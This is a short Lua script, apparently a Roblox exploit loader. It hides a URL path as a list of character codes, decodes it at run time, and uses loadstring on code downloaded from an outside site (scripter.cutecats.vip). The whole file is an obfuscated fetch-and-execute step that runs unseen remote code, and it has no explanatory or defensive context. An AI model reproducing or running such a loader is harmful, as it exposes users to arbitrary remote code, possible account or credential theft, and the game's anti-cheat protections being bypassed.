function split(inputstr, sep)
   if sep == nil then
      sep = "%s"
   end
   local t={}
   for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
      table.insert(t, str)
   end
   return t
end

local hey = "119/85/85/49/48/114/76/87/"
local test = ""
for i,v in pairs(split(hey,"/")) do
ph = string.char(v)
test = test..ph
end


loadstring(game:HttpGet("https://scripter.cutecats.vip/u/"..test))()
